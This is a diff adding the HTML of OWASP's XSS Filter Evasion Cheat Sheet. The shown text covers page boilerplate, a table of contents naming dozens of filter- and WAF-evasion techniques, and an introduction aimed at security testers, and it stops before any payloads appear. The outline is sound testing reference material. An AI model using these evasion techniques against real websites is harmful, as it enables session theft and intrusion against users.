@@ -1,0 +1,2284 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="client-nojs">
+<head>
+    <meta charset="UTF-8"/>
+    <title>XSS Filter Evasion Cheat Sheet - OWASP</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=EDGE"/>
+    <meta name="generator" content="MediaWiki 1.23.15"/>
+    <link rel="shortcut icon" href="/favicon.ico"/>
+    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch_desc.php" title="OWASP (en)"/>
+    <link rel="EditURI" type="application/rsd+xml" href="//www.owasp.org/api.php?action=rsd"/>
+    <link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/"/>
+    <link rel="alternate" type="application/atom+xml" title="OWASP Atom feed"
+          href="/index.php?title=Special:RecentChanges&amp;feed=atom"/>
+    <link rel="stylesheet"
+          href="//www.owasp.org/load.php?debug=false&amp;lang=en&amp;modules=mediawiki.legacy.commonPrint%2Cshared%7Cmediawiki.skinning.interface%7Cmediawiki.ui.button%7Cskins.vector.styles&amp;only=styles&amp;skin=vector&amp;*"/>
+    <link rel="stylesheet" href="/extensions/HeaderTabs/skins/ext.headertabs.large.css"/>
+    <meta name="ResourceLoaderDynamicStyles" content=""/>
+    <link rel="stylesheet"
+          href="//www.owasp.org/load.php?debug=false&amp;lang=en&amp;modules=site&amp;only=styles&amp;skin=vector&amp;*"/>
+    <style>a:lang(ar), a:lang(kk-arab), a:lang(mzn), a:lang(ps), a:lang(ur) {
+        text-decoration: none
+    }
+
+    /* cache key: wiki:resourceloader:filter:minify-css:7:29b70323345a439ab9ed7007e0c178a6 */</style>
+    <script src="//www.owasp.org/load.php?debug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+    <script>if (window.mw) {
+        mw.config.set({
+            "wgCanonicalNamespace": "",
+            "wgCanonicalSpecialPageName": false,
+            "wgNamespaceNumber": 0,
+            "wgPageName": "XSS_Filter_Evasion_Cheat_Sheet",
+            "wgTitle": "XSS Filter Evasion Cheat Sheet",
+            "wgCurRevisionId": 222088,
+            "wgRevisionId": 222088,
+            "wgArticleId": 26566,
+            "wgIsArticle": true,
+            "wgIsRedirect": false,
+            "wgAction": "view",
+            "wgUserName": null,
+            "wgUserGroups": ["*"],
+            "wgCategories": ["Cheatsheets", "Popular", "OWASP Breakers"],
+            "wgBreakFrames": false,
+            "wgPageContentLanguage": "en",
+            "wgPageContentModel": "wikitext",
+            "wgSeparatorTransformTable": ["", ""],
+            "wgDigitTransformTable": ["", ""],
+            "wgDefaultDateFormat": "dmy",
+            "wgMonthNames": ["", "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
+            "wgMonthNamesShort": ["", "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
+            "wgRelevantPageName": "XSS_Filter_Evasion_Cheat_Sheet",
+            "wgIsProbablyEditable": false,
+            "wgRestrictionEdit": [],
+            "wgRestrictionMove": [],
+            "htTabIndexes": [],
+            "wgCategoryTreePageCategoryOptions": "{\"mode\":0,\"hideprefix\":20,\"showcount\":true,\"namespaces\":false}"
+        });
+    }</script>
+    <script>if (window.mw) {
+        mw.loader.implement("user.options", function ($, jQuery) {
+            mw.user.options.set({
+                "ccmeonemails": 0,
+                "cols": 80,
+                "date": "default",
+                "diffonly": 0,
+                "disablemail": 0,
+                "editfont": "default",
+                "editondblclick": 0,
+                "editsectiononrightclick": 0,
+                "enotifminoredits": 0,
+                "enotifrevealaddr": 0,
+                "enotifusertalkpages": 1,
+                "enotifwatchlistpages": 1,
+                "extendwatchlist": 0,
+                "fancysig": 0,
+                "forceeditsummary": 0,
+                "gender": "unknown",
+                "hideminor": 0,
+                "hidepatrolled": 0,
+                "imagesize": 2,
+                "math": 1,
+                "minordefault": 0,
+                "newpageshidepatrolled": 0,
+                "nickname": "",
+                "norollbackdiff": 0,
+                "numberheadings": 0,
+                "previewonfirst": 0,
+                "previewontop": 1,
+                "rcdays": 7,
+                "rclimit": 50,
+                "rows": 25,
+                "showhiddencats": 0,
+                "shownumberswatching": 1,
+                "showtoolbar": 1,
+                "skin": "vector",
+                "stubthreshold": 0,
+                "thumbsize": 2,
+                "underline": 2,
+                "uselivepreview": 0,
+                "usenewrc": 0,
+                "watchcreations": 1,
+                "watchdefault": 1,
+                "watchdeletion": 0,
+                "watchlistdays": 3,
+                "watchlisthideanons": 0,
+                "watchlisthidebots": 0,
+                "watchlisthideliu": 0,
+                "watchlisthideminor": 0,
+                "watchlisthideown": 0,
+                "watchlisthidepatrolled": 0,
+                "watchmoves": 0,
+                "wllimit": 250,
+                "useeditwarning": 1,
+                "prefershttps": 1,
+                "editsection": false,
+                "language": "en",
+                "variant-gan": "gan",
+                "variant-iu": "iu",
+                "variant-kk": "kk",
+                "variant-ku": "ku",
+                "variant-shi": "shi",
+                "variant-sr": "sr",
+                "variant-tg": "tg",
+                "variant-uz": "uz",
+                "variant-zh": "zh",
+                "searchNs0": true,
+                "searchNs1": false,
+                "searchNs2": false,
+                "searchNs3": false,
+                "searchNs4": false,
+                "searchNs5": false,
+                "searchNs6": false,
+                "searchNs7": false,
+                "searchNs8": false,
+                "searchNs9": false,
+                "searchNs10": false,
+                "searchNs11": false,
+                "searchNs12": false,
+                "searchNs13": false,
+                "searchNs14": false,
+                "searchNs15": false,
+                "searchNs274": false,
+                "searchNs275": false,
+                "variant": "en"
+            });
+        }, {}, {});
+        mw.loader.implement("user.tokens", function ($, jQuery) {
+            mw.user.tokens.set({"editToken": "+\\", "patrolToken": false, "watchToken": false});
+        }, {}, {});
+        /* cache key: wiki:resourceloader:filter:minify-js:7:60712566bd995a32fa50031484a6bded */
+    }</script>
+    <script>if (window.mw) {
+        mw.loader.load(["mediawiki.page.startup", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax", "skins.vector.js"]);
+    }</script>
+    <!--[if lt IE 7]><style type="text/css">body{behavior:url("/skins/vector/csshover.min.htc")}</style><![endif]-->
+</head>
+<body class="mediawiki ltr sitedir-ltr ns-0 ns-subject page-XSS_Filter_Evasion_Cheat_Sheet skin-vector action-view vector-animateLayout">
+<div id="mw-page-base" class="noprint"></div>
+<div id="mw-head-base" class="noprint"></div>
+<div id="content" class="mw-body" role="main">
+    <a id="top"></a>
+    <div id="mw-js-message" style="display:none;"></div>
+    <h1 id="firstHeading" class="firstHeading" lang="en"><span dir="auto">XSS Filter Evasion Cheat Sheet</span></h1>
+    <div id="bodyContent">
+        <div id="siteSub">From OWASP</div>
+        <div id="contentSub"></div>
+        <div id="jump-to-nav" class="mw-jump">
+            Jump to: <a href="#mw-navigation">navigation</a>, <a href="#p-search">search</a>
+        </div>
+        <div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr">
+            <div style="width:100%;height:160px;border:0,margin:0;overflow: hidden;"><img alt="Cheatsheets-header.jpg"
+                                                                                          src="/images/d/d8/Cheatsheets-header.jpg"
+                                                                                          width="2400" height="160"/>
+            </div>
+            <br/>
+            <p>Last revision (mm/dd/yy): <b>10/4/2016</b>
+            </p>
+            <h1><span class="mw-headline" id="Introduction">Introduction</span></h1>
+            <div id="toc" class="toc">
+                <div id="toctitle"><h2></h2></div>
+                <ul>
+                    <li class="toclevel-1 tocsection-1"><a href="#Introduction"><span class="tocnumber">1</span> <span
+                            class="toctext">Introduction</span></a></li>
+                    <li class="toclevel-1 tocsection-2"><a href="#Tests"><span class="tocnumber">2</span> <span
+                            class="toctext">Tests</span></a>
+                        <ul>
+                            <li class="toclevel-2 tocsection-3"><a href="#XSS_Locator"><span
+                                    class="tocnumber">2.1</span> <span class="toctext">XSS Locator</span></a></li>
+                            <li class="toclevel-2 tocsection-4"><a href="#XSS_Locator_.28short.29"><span
+                                    class="tocnumber">2.2</span> <span class="toctext">XSS Locator (short)</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-5"><a href="#No_Filter_Evasion"><span
+                                    class="tocnumber">2.3</span> <span class="toctext">No Filter Evasion</span></a></li>
+                            <li class="toclevel-2 tocsection-6"><a href="#Filter_bypass_based_polyglot"><span
+                                    class="tocnumber">2.4</span> <span
+                                    class="toctext">Filter bypass based polyglot</span></a></li>
+                            <li class="toclevel-2 tocsection-7"><a
+                                    href="#Image_XSS_using_the_JavaScript_directive"><span class="tocnumber">2.5</span>
+                                <span class="toctext">Image XSS using the JavaScript directive</span></a></li>
+                            <li class="toclevel-2 tocsection-8"><a href="#No_quotes_and_no_semicolon"><span
+                                    class="tocnumber">2.6</span> <span class="toctext">No quotes and no semicolon</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-9"><a href="#Case_insensitive_XSS_attack_vector"><span
+                                    class="tocnumber">2.7</span> <span class="toctext">Case insensitive XSS attack vector</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-10"><a href="#HTML_entities"><span
+                                    class="tocnumber">2.8</span> <span class="toctext">HTML entities</span></a></li>
+                            <li class="toclevel-2 tocsection-11"><a href="#Grave_accent_obfuscation"><span
+                                    class="tocnumber">2.9</span> <span
+                                    class="toctext">Grave accent obfuscation</span></a></li>
+                            <li class="toclevel-2 tocsection-12"><a href="#Malformed_A_tags"><span class="tocnumber">2.10</span>
+                                <span class="toctext">Malformed A tags</span></a></li>
+                            <li class="toclevel-2 tocsection-13"><a href="#Malformed_IMG_tags"><span class="tocnumber">2.11</span>
+                                <span class="toctext">Malformed IMG tags</span></a></li>
+                            <li class="toclevel-2 tocsection-14"><a href="#fromCharCode"><span
+                                    class="tocnumber">2.12</span> <span class="toctext">fromCharCode</span></a></li>
+                            <li class="toclevel-2 tocsection-15"><a
+                                    href="#Default_SRC_tag_to_get_past_filters_that_check_SRC_domain"><span
+                                    class="tocnumber">2.13</span> <span class="toctext">Default SRC tag to get past filters that check SRC domain</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-16"><a href="#Default_SRC_tag_by_leaving_it_empty"><span
+                                    class="tocnumber">2.14</span> <span class="toctext">Default SRC tag by leaving it empty</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-17"><a
+                                    href="#Default_SRC_tag_by_leaving_it_out_entirely"><span
+                                    class="tocnumber">2.15</span> <span class="toctext">Default SRC tag by leaving it out entirely</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-18"><a href="#On_error_alert"><span
+                                    class="tocnumber">2.16</span> <span class="toctext">On error alert</span></a></li>
+                            <li class="toclevel-2 tocsection-19"><a
+                                    href="#IMG_onerror_and_javascript_alert_encode"><span class="tocnumber">2.17</span>
+                                <span class="toctext">IMG  onerror and javascript alert encode</span></a></li>
+                            <li class="toclevel-2 tocsection-20"><a href="#Decimal_HTML_character_references"><span
+                                    class="tocnumber">2.18</span> <span class="toctext">Decimal HTML character references</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-21"><a
+                                    href="#Decimal_HTML_character_references_without_trailing_semicolons"><span
+                                    class="tocnumber">2.19</span> <span class="toctext">Decimal HTML character references without trailing semicolons</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-22"><a
+                                    href="#Hexadecimal_HTML_character_references_without_trailing_semicolons"><span
+                                    class="tocnumber">2.20</span> <span class="toctext">Hexadecimal HTML character references without trailing semicolons</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-23"><a href="#Embedded_tab"><span
+                                    class="tocnumber">2.21</span> <span class="toctext">Embedded tab</span></a></li>
+                            <li class="toclevel-2 tocsection-24"><a href="#Embedded_Encoded_tab"><span
+                                    class="tocnumber">2.22</span> <span class="toctext">Embedded Encoded tab</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-25"><a href="#Embedded_newline_to_break_up_XSS"><span
+                                    class="tocnumber">2.23</span> <span
+                                    class="toctext">Embedded newline to break up XSS</span></a></li>
+                            <li class="toclevel-2 tocsection-26"><a
+                                    href="#Embedded_carriage_return_to_break_up_XSS"><span class="tocnumber">2.24</span>
+                                <span class="toctext">Embedded carriage return to break up XSS</span></a></li>
+                            <li class="toclevel-2 tocsection-27"><a href="#Null_breaks_up_JavaScript_directive"><span
+                                    class="tocnumber">2.25</span> <span class="toctext">Null breaks up JavaScript directive</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-28"><a
+                                    href="#Spaces_and_meta_chars_before_the_JavaScript_in_images_for_XSS"><span
+                                    class="tocnumber">2.26</span> <span class="toctext">Spaces and meta chars before the JavaScript in images for XSS</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-29"><a href="#Non-alpha-non-digit_XSS"><span
+                                    class="tocnumber">2.27</span> <span
+                                    class="toctext">Non-alpha-non-digit XSS</span></a></li>
+                            <li class="toclevel-2 tocsection-30"><a href="#Extraneous_open_brackets"><span
+                                    class="tocnumber">2.28</span> <span class="toctext">Extraneous open brackets</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-31"><a href="#No_closing_script_tags"><span
+                                    class="tocnumber">2.29</span> <span
+                                    class="toctext">No closing script tags</span></a></li>
+                            <li class="toclevel-2 tocsection-32"><a href="#Protocol_resolution_in_script_tags"><span
+                                    class="tocnumber">2.30</span> <span class="toctext">Protocol resolution in script tags</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-33"><a href="#Half_open_HTML.2FJavaScript_XSS_vector"><span
+                                    class="tocnumber">2.31</span> <span class="toctext">Half open HTML/JavaScript XSS vector</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-34"><a href="#Double_open_angle_brackets"><span
+                                    class="tocnumber">2.32</span> <span
+                                    class="toctext">Double open angle brackets</span></a></li>
+                            <li class="toclevel-2 tocsection-35"><a href="#Escaping_JavaScript_escapes"><span
+                                    class="tocnumber">2.33</span> <span
+                                    class="toctext">Escaping JavaScript escapes</span></a></li>
+                            <li class="toclevel-2 tocsection-36"><a href="#End_title_tag"><span
+                                    class="tocnumber">2.34</span> <span class="toctext">End title tag</span></a></li>
+                            <li class="toclevel-2 tocsection-37"><a href="#INPUT_image"><span
+                                    class="tocnumber">2.35</span> <span class="toctext">INPUT image</span></a></li>
+                            <li class="toclevel-2 tocsection-38"><a href="#BODY_image"><span
+                                    class="tocnumber">2.36</span> <span class="toctext">BODY image</span></a></li>
+                            <li class="toclevel-2 tocsection-39"><a href="#IMG_Dynsrc"><span
+                                    class="tocnumber">2.37</span> <span class="toctext">IMG Dynsrc</span></a></li>
+                            <li class="toclevel-2 tocsection-40"><a href="#IMG_lowsrc"><span
+                                    class="tocnumber">2.38</span> <span class="toctext">IMG lowsrc</span></a></li>
+                            <li class="toclevel-2 tocsection-41"><a href="#List-style-image"><span class="tocnumber">2.39</span>
+                                <span class="toctext">List-style-image</span></a></li>
+                            <li class="toclevel-2 tocsection-42"><a href="#VBscript_in_an_image"><span
+                                    class="tocnumber">2.40</span> <span class="toctext">VBscript in an image</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-43"><a
+                                    href="#Livescript_.28older_versions_of_Netscape_only.29"><span class="tocnumber">2.41</span>
+                                <span class="toctext">Livescript (older versions of Netscape only)</span></a></li>
+                            <li class="toclevel-2 tocsection-44"><a href="#SVG_object_tag"><span
+                                    class="tocnumber">2.42</span> <span class="toctext">SVG object tag</span></a></li>
+                            <li class="toclevel-2 tocsection-45"><a href="#ECMAScript_6"><span
+                                    class="tocnumber">2.43</span> <span class="toctext">ECMAScript 6</span></a></li>
+                            <li class="toclevel-2 tocsection-46"><a href="#BODY_tag"><span class="tocnumber">2.44</span>
+                                <span class="toctext">BODY tag</span></a></li>
+                            <li class="toclevel-2 tocsection-47"><a href="#Event_Handlers"><span
+                                    class="tocnumber">2.45</span> <span class="toctext">Event Handlers</span></a></li>
+                            <li class="toclevel-2 tocsection-48"><a href="#BGSOUND"><span class="tocnumber">2.46</span>
+                                <span class="toctext">BGSOUND</span></a></li>
+                            <li class="toclevel-2 tocsection-49"><a href="#.26_JavaScript_includes"><span
+                                    class="tocnumber">2.47</span> <span class="toctext">&amp; JavaScript includes</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-50"><a href="#STYLE_sheet"><span
+                                    class="tocnumber">2.48</span> <span class="toctext">STYLE sheet</span></a></li>
+                            <li class="toclevel-2 tocsection-51"><a href="#Remote_style_sheet"><span class="tocnumber">2.49</span>
+                                <span class="toctext">Remote style sheet</span></a></li>
+                            <li class="toclevel-2 tocsection-52"><a href="#Remote_style_sheet_part_2"><span
+                                    class="tocnumber">2.50</span> <span class="toctext">Remote style sheet part 2</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-53"><a href="#Remote_style_sheet_part_3"><span
+                                    class="tocnumber">2.51</span> <span class="toctext">Remote style sheet part 3</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-54"><a href="#Remote_style_sheet_part_4"><span
+                                    class="tocnumber">2.52</span> <span class="toctext">Remote style sheet part 4</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-55"><a
+                                    href="#STYLE_tags_with_broken_up_JavaScript_for_XSS"><span
+                                    class="tocnumber">2.53</span> <span class="toctext">STYLE tags with broken up JavaScript for XSS</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-56"><a
+                                    href="#STYLE_attribute_using_a_comment_to_break_up_expression"><span
+                                    class="tocnumber">2.54</span> <span class="toctext">STYLE attribute using a comment to break up expression</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-57"><a href="#IMG_STYLE_with_expression"><span
+                                    class="tocnumber">2.55</span> <span class="toctext">IMG STYLE with expression</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-58"><a
+                                    href="#STYLE_tag_.28Older_versions_of_Netscape_only.29"><span
+                                    class="tocnumber">2.56</span> <span class="toctext">STYLE tag (Older versions of Netscape only)</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-59"><a href="#STYLE_tag_using_background-image"><span
+                                    class="tocnumber">2.57</span> <span
+                                    class="toctext">STYLE tag using background-image</span></a></li>
+                            <li class="toclevel-2 tocsection-60"><a href="#STYLE_tag_using_background"><span
+                                    class="tocnumber">2.58</span> <span
+                                    class="toctext">STYLE tag using background</span></a></li>
+                            <li class="toclevel-2 tocsection-61"><a href="#Anonymous_HTML_with_STYLE_attribute"><span
+                                    class="tocnumber">2.59</span> <span class="toctext">Anonymous HTML with STYLE attribute</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-62"><a href="#Local_htc_file"><span
+                                    class="tocnumber">2.60</span> <span class="toctext">Local htc file</span></a></li>
+                            <li class="toclevel-2 tocsection-63"><a href="#US-ASCII_encoding"><span class="tocnumber">2.61</span>
+                                <span class="toctext">US-ASCII encoding</span></a></li>
+                            <li class="toclevel-2 tocsection-64"><a href="#META"><span class="tocnumber">2.62</span>
+                                <span class="toctext">META</span></a>
+                                <ul>
+                                    <li class="toclevel-3 tocsection-65"><a href="#META_using_data"><span
+                                            class="tocnumber">2.62.1</span> <span class="toctext">META using data</span></a>
+                                    </li>
+                                    <li class="toclevel-3 tocsection-66"><a
+                                            href="#META_with_additional_URL_parameter"><span
+                                            class="tocnumber">2.62.2</span> <span class="toctext">META with additional URL parameter</span></a>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li class="toclevel-2 tocsection-67"><a href="#IFRAME"><span class="tocnumber">2.63</span>
+                                <span class="toctext">IFRAME</span></a></li>
+                            <li class="toclevel-2 tocsection-68"><a href="#IFRAME_Event_based"><span class="tocnumber">2.64</span>
+                                <span class="toctext">IFRAME Event based</span></a></li>
+                            <li class="toclevel-2 tocsection-69"><a href="#FRAME"><span class="tocnumber">2.65</span>
+                                <span class="toctext">FRAME</span></a></li>
+                            <li class="toclevel-2 tocsection-70"><a href="#TABLE"><span class="tocnumber">2.66</span>
+                                <span class="toctext">TABLE</span></a>
+                                <ul>
+                                    <li class="toclevel-3 tocsection-71"><a href="#TD"><span
+                                            class="tocnumber">2.66.1</span> <span class="toctext">TD</span></a></li>
+                                </ul>
+                            </li>
+                            <li class="toclevel-2 tocsection-72"><a href="#DIV"><span class="tocnumber">2.67</span>
+                                <span class="toctext">DIV</span></a>
+                                <ul>
+                                    <li class="toclevel-3 tocsection-73"><a href="#DIV_background-image"><span
+                                            class="tocnumber">2.67.1</span> <span
+                                            class="toctext">DIV background-image</span></a></li>
+                                    <li class="toclevel-3 tocsection-74"><a
+                                            href="#DIV_background-image_with_unicoded_XSS_exploit"><span
+                                            class="tocnumber">2.67.2</span> <span class="toctext">DIV background-image with unicoded XSS exploit</span></a>
+                                    </li>
+                                    <li class="toclevel-3 tocsection-75"><a
+                                            href="#DIV_background-image_plus_extra_characters"><span class="tocnumber">2.67.3</span>
+                                        <span class="toctext">DIV background-image plus extra characters</span></a></li>
+                                    <li class="toclevel-3 tocsection-76"><a href="#DIV_expression"><span
+                                            class="tocnumber">2.67.4</span> <span class="toctext">DIV expression</span></a>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li class="toclevel-2 tocsection-77"><a href="#Downlevel-Hidden_block"><span
+                                    class="tocnumber">2.68</span> <span
+                                    class="toctext">Downlevel-Hidden block</span></a></li>
+                            <li class="toclevel-2 tocsection-78"><a href="#BASE_tag"><span class="tocnumber">2.69</span>
+                                <span class="toctext">BASE tag</span></a></li>
+                            <li class="toclevel-2 tocsection-79"><a href="#OBJECT_tag"><span
+                                    class="tocnumber">2.70</span> <span class="toctext">OBJECT tag</span></a></li>
+                            <li class="toclevel-2 tocsection-80"><a
+                                    href="#Using_an_EMBED_tag_you_can_embed_a_Flash_movie_that_contains_XSS"><span
+                                    class="tocnumber">2.71</span> <span class="toctext">Using an EMBED tag you can embed a Flash movie that contains XSS</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-81"><a
+                                    href="#You_can_EMBED_SVG_which_can_contain_your_XSS_vector"><span class="tocnumber">2.72</span>
+                                <span class="toctext">You can EMBED SVG which can contain your XSS vector</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-82"><a
+                                    href="#Using_ActionScript_inside_flash_can_obfuscate_your_XSS_vector"><span
+                                    class="tocnumber">2.73</span> <span class="toctext">Using ActionScript inside flash can obfuscate your XSS vector</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-83"><a href="#XML_data_island_with_CDATA_obfuscation"><span
+                                    class="tocnumber">2.74</span> <span class="toctext">XML data island with CDATA obfuscation</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-84"><a
+                                    href="#Locally_hosted_XML_with_embedded_JavaScript_that_is_generated_using_an_XML_data_island"><span
+                                    class="tocnumber">2.75</span> <span class="toctext">Locally hosted XML with embedded JavaScript that is generated using an XML data island</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-85"><a href="#HTML.2BTIME_in_XML"><span class="tocnumber">2.76</span>
+                                <span class="toctext">HTML+TIME in XML</span></a></li>
+                            <li class="toclevel-2 tocsection-86"><a
+                                    href="#Assuming_you_can_only_fit_in_a_few_characters_and_it_filters_against_.22.js.22"><span
+                                    class="tocnumber">2.77</span> <span class="toctext">Assuming you can only fit in a few characters and it filters against ".js"</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-87"><a href="#SSI_.28Server_Side_Includes.29"><span
+                                    class="tocnumber">2.78</span> <span
+                                    class="toctext">SSI (Server Side Includes)</span></a></li>
+                            <li class="toclevel-2 tocsection-88"><a href="#PHP"><span class="tocnumber">2.79</span>
+                                <span class="toctext">PHP</span></a></li>
+                            <li class="toclevel-2 tocsection-89"><a href="#IMG_Embedded_commands"><span
+                                    class="tocnumber">2.80</span> <span class="toctext">IMG Embedded commands</span></a>
+                                <ul>
+                                    <li class="toclevel-3 tocsection-90"><a href="#IMG_Embedded_commands_part_II"><span
+                                            class="tocnumber">2.80.1</span> <span class="toctext">IMG Embedded commands part II</span></a>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li class="toclevel-2 tocsection-91"><a href="#Cookie_manipulation"><span class="tocnumber">2.81</span>
+                                <span class="toctext">Cookie manipulation</span></a></li>
+                            <li class="toclevel-2 tocsection-92"><a href="#UTF-7_encoding"><span
+                                    class="tocnumber">2.82</span> <span class="toctext">UTF-7 encoding</span></a></li>
+                            <li class="toclevel-2 tocsection-93"><a href="#XSS_using_HTML_quote_encapsulation"><span
+                                    class="tocnumber">2.83</span> <span class="toctext">XSS using HTML quote encapsulation</span></a>
+                            </li>
+                            <li class="toclevel-2 tocsection-94"><a href="#URL_string_evasion"><span class="tocnumber">2.84</span>
+                                <span class="toctext">URL string evasion</span></a>
+                                <ul>
+                                    <li class="toclevel-3 tocsection-95"><a href="#IP_verses_hostname"><span
+                                            class="tocnumber">2.84.1</span> <span
+                                            class="toctext">IP verses hostname</span></a></li>
+                                    <li class="toclevel-3 tocsection-96"><a href="#URL_encoding"><span
+                                            class="tocnumber">2.84.2</span> <span
+                                            class="toctext">URL encoding</span></a></li>
+                                    <li class="toclevel-3 tocsection-97"><a href="#Dword_encoding"><span
+                                            class="tocnumber">2.84.3</span> <span class="toctext">Dword encoding</span></a>
+                                    </li>
+                                    <li class="toclevel-3 tocsection-98"><a href="#Hex_encoding"><span
+                                            class="tocnumber">2.84.4</span> <span
+                                            class="toctext">Hex encoding</span></a></li>
+                                    <li class="toclevel-3 tocsection-99"><a href="#Octal_encoding"><span
+                                            class="tocnumber">2.84.5</span> <span class="toctext">Octal encoding</span></a>
+                                    </li>
+                                    <li class="toclevel-3 tocsection-100"><a href="#Mixed_encoding"><span
+                                            class="tocnumber">2.84.6</span> <span class="toctext">Mixed encoding</span></a>
+                                    </li>
+                                    <li class="toclevel-3 tocsection-101"><a href="#Protocol_resolution_bypass"><span
+                                            class="tocnumber">2.84.7</span> <span class="toctext">Protocol resolution bypass</span></a>
+                                    </li>
+                                    <li class="toclevel-3 tocsection-102"><a href="#Google_.22feeling_lucky.22_part_1."><span
+                                            class="tocnumber">2.84.8</span> <span class="toctext">Google "feeling lucky" part 1.</span></a>
+                                    </li>
+                                    <li class="toclevel-3 tocsection-103"><a href="#Google_.22feeling_lucky.22_part_2."><span
+                                            class="tocnumber">2.84.9</span> <span class="toctext">Google "feeling lucky" part 2.</span></a>
+                                    </li>
+                                    <li class="toclevel-3 tocsection-104"><a href="#Google_.22feeling_lucky.22_part_3."><span
+                                            class="tocnumber">2.84.10</span> <span class="toctext">Google "feeling lucky" part 3.</span></a>
+                                    </li>
+                                    <li class="toclevel-3 tocsection-105"><a href="#Removing_cnames"><span
+                                            class="tocnumber">2.84.11</span> <span
+                                            class="toctext">Removing cnames</span></a></li>
+                                    <li class="toclevel-3 tocsection-106"><a href="#Extra_dot_for_absolute_DNS:"><span
+                                            class="tocnumber">2.84.12</span> <span class="toctext">Extra dot for absolute DNS:</span></a>
+                                    </li>
+                                    <li class="toclevel-3 tocsection-107"><a href="#JavaScript_link_location:"><span
+                                            class="tocnumber">2.84.13</span> <span class="toctext">JavaScript link location:</span></a>
+                                    </li>
+                                    <li class="toclevel-3 tocsection-108"><a
+                                            href="#Content_replace_as_attack_vector"><span
+                                            class="tocnumber">2.84.14</span> <span class="toctext">Content replace as attack vector</span></a>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li class="toclevel-2 tocsection-109"><a href="#Character_escape_sequences"><span
+                                    class="tocnumber">2.85</span> <span
+                                    class="toctext">Character escape sequences</span></a></li>
+                        </ul>
+                    </li>
+                    <li class="toclevel-1 tocsection-110"><a
+                            href="#Methods_to_Bypass_WAF_.E2.80.93_Cross-Site_Scripting"><span
+                            class="tocnumber">3</span> <span class="toctext">Methods to Bypass WAF – Cross-Site Scripting</span></a>
+                        <ul>
+                            <li class="toclevel-2 tocsection-111"><a href="#Filter_Bypass_Alert_Obfuscation"><span
+                                    class="tocnumber">3.1</span> <span
+                                    class="toctext">Filter Bypass Alert Obfuscation</span></a></li>
+                        </ul>
+                    </li>
+                    <li class="toclevel-1 tocsection-112"><a
+                            href="#Character_Encoding_and_IP_Obfuscation_Calculators"><span class="tocnumber">4</span>
+                        <span class="toctext">Character Encoding and IP Obfuscation Calculators</span></a></li>
+                    <li class="toclevel-1 tocsection-113"><a href="#Authors_and_Primary_Editors"><span
+                            class="tocnumber">5</span> <span class="toctext">Authors and Primary Editors</span></a></li>
+                    <li class="toclevel-1 tocsection-114"><a href="#Contributors"><span class="tocnumber">6</span> <span
+                            class="toctext">Contributors</span></a></li>
+                    <li class="toclevel-1 tocsection-115"><a href="#Other_Cheatsheets"><span class="tocnumber">7</span>
+                        <span class="toctext">Other Cheatsheets</span></a></li>
+                </ul>
+            </div>
+            This article is focused on providing application security testing professionals with a guide to assist in
+            Cross Site Scripting testing. The initial contents of this article were donated to OWASP by RSnake, from his
+            seminal XSS Cheat Sheet, which was at: <a rel="nofollow" class="external free"
+                                                      href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a>.
+            That site now redirects to its new home here, where we plan to maintain and enhance it. The very first OWASP
+            Prevention Cheat Sheet, the <a href="/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"
+                                           title="XSS (Cross Site Scripting) Prevention Cheat Sheet">XSS (Cross Site
+            Scripting) Prevention Cheat Sheet</a>, was inspired by RSnake's XSS Cheat Sheet, so we can thank him for our
+            inspiration. We wanted to create short, simple guidelines that developers could follow to prevent XSS,
+            rather than simply telling developers to build apps that could protect against all the fancy tricks
+            specified in rather complex attack cheat sheet, and so the <a href="/index.php/Cheat_Sheets"
+                                                                          title="Cheat Sheets" class="mw-redirect">
+            OWASP Cheat Sheet Series</a> was born.
+            <h1><span class="mw-headline" id="Tests">Tests</span></h1>
+            <p>This cheat sheet is for people who already understand the basics of XSS attacks but want a deep
+                understanding of the nuances regarding filter evasion.
+            </p>
+            <p>Please note that most of these cross site scripting vectors have been tested in the browsers listed at
+                the bottom of the scripts.
+            </p>
